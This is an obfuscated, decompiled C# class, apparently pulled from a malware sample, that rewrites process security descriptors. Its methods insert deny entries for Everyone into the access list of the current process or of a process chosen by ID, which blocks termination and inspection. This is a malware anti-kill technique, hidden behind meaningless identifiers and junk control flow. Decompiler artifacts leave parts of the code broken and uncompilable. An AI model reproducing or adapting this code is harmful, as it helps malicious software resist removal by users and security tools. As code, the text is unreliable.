using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

internal class ______________________________________________________________________________
{
	[System.Flags]
	public enum _______________________________________________________________________________
	{
		_ = 987135
	}

	[System.Runtime.InteropServices.DllImport("kernel32.dll")]
	public static extern System.IntPtr GetCurrentProcess();

	[System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(System.IntPtr intptr_0, int int_0, [System.Runtime.InteropServices.In] byte[] byte_0);

	[System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(System.IntPtr intptr_0, int int_0, [System.Runtime.InteropServices.Out] byte[] byte_0, uint uint_0, ref uint uint_1);

	public static void ____()
	{
		try
		{
			System.IntPtr currentProcess = ______________________________________________________________________________.GetCurrentProcess();
			System.Security.AccessControl.RawSecurityDescriptor rawSecurityDescriptor = ______________________________________________________________________________.______(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new System.Security.AccessControl.CommonAce(System.Security.AccessControl.AceFlags.None, System.Security.AccessControl.AceQualifier.AccessDenied, System.Convert.ToInt32(987135), new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid, null), false, null));
			rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new System.Security.AccessControl.CommonAce(System.Security.AccessControl.AceFlags.None, System.Security.AccessControl.AceQualifier.AccessDenied, System.Convert.ToInt32(4096), new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid, null), false, null));
			______________________________________________________________________________._______(currentProcess, rawSecurityDescriptor);
		}
		catch (System.Exception arg_62_0)
		{
			ProjectData.SetProjectError(arg_62_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____(int int_0)
	{
		try
		{
			System.IntPtr handle = Process.GetProcessById(int_0).Handle;
			System.Security.AccessControl.RawSecurityDescriptor rawSecurityDescriptor = ______________________________________________________________________________.______(handle);
			switch (sizeof(ulong) + -8)
			{
			case 0:
				IL_25:
				rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new System.Security.AccessControl.CommonAce(System.Security.AccessControl.AceFlags.None, System.Security.AccessControl.AceQualifier.AccessDenied, System.Convert.ToInt32(987135), new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid, null), false, null));
				rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new System.Security.AccessControl.CommonAce(System.Security.AccessControl.AceFlags.None, System.Security.AccessControl.AceQualifier.AccessDenied, System.Convert.ToInt32(4096), new System.Security.Principal.SecurityIdentifier(System.Security.Principal.WellKnownSidType.WorldSid, null), false, null));
				______________________________________________________________________________._______(handle, rawSecurityDescriptor);
				return;
			}
			goto IL_25;
		}
		catch (System.Exception arg_7A_0)
		{
			ProjectData.SetProjectError(arg_7A_0);
			ProjectData.ClearProjectError();
		}
	}

	public static System.Security.AccessControl.RawSecurityDescriptor ______(System.IntPtr intptr_0)
	{
		System.Security.AccessControl.RawSecurityDescriptor result;
		try
		{
			byte[] array = new byte[0];
			uint num = 0u;
			______________________________________________________________________________.GetKernelObjectSecurity(intptr_0, 4, array, 0u, ref num);
			int arg_2D_0 = 1;
			int arg_24_0 = 3395;
			int _________ = <Module>.__________;
			if ((arg_2D_0 & (arg_24_0 + _________ ^ _________ + -7957)) != 0)
			{
				switch (((num * 32768u ^ 5363u) == 0u) ? (sizeof(ushort) + 1938339977) : (sizeof(int) + 1747541202))
				{
				}
			}
			if ((ulong)num < 0uL || (ulong)num > 32767uL)
			{
				throw new Win32Exception();
			}
			if (!______________________________________________________________________________.GetKernelObjectSecurity(intptr_0, 4, ______________________________________________________________________________.________<byte[]>(ref array, new byte[(int)((ulong)num - 1uL) + 1]), num, ref num))
			{
				throw new Win32Exception();
			}
			result = new System.Security.AccessControl.RawSecurityDescriptor(array, 0);
		}
		catch (System.Exception arg_BE_0)
		{
			ProjectData.SetProjectError(arg_BE_0);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void _______(System.IntPtr intptr_0, System.Security.AccessControl.RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			<Module>.___________ = 1657774894;
			int num2 = 2;
			int arg_38_0 = System.Type.EmptyTypes.Length + 1;
			byte[] array;
			while (true)
			{
				switch (arg_38_0)
				{
				case 0:
					goto IL_47;
				}
				array = new byte[rawSecurityDescriptor_0.BinaryLength - 1 + 1];
				arg_38_0 = System.Type.EmptyTypes.Length + 0;
			}
			IL_47:
			num2 = 3;
			rawSecurityDescriptor_0.GetBinaryForm(array, 0);
			IL_53:
			num2 = 4;
			if (______________________________________________________________________________.SetKernelObjectSecurity(intptr_0, 4, array))
			{
				goto IL_6A;
			}
			IL_61:
			num2 = 5;
			throw new Win32Exception();
			IL_6A:
			goto IL_D8;
			IL_6C:
			int arg_71_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_71_0);
			IL_96:
			goto IL_CD;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_AA:
			goto IL_CD;
		}
		object arg_AC_0;
		endfilter(arg_AC_0 is System.Exception & num != 0 & num3 == 0);
		IL_CD:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_D8:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static _ ________<_>(ref _ gparam_0, _ gparam_1)
	{
		gparam_0 = gparam_1;
		return gparam_1;
	}
}
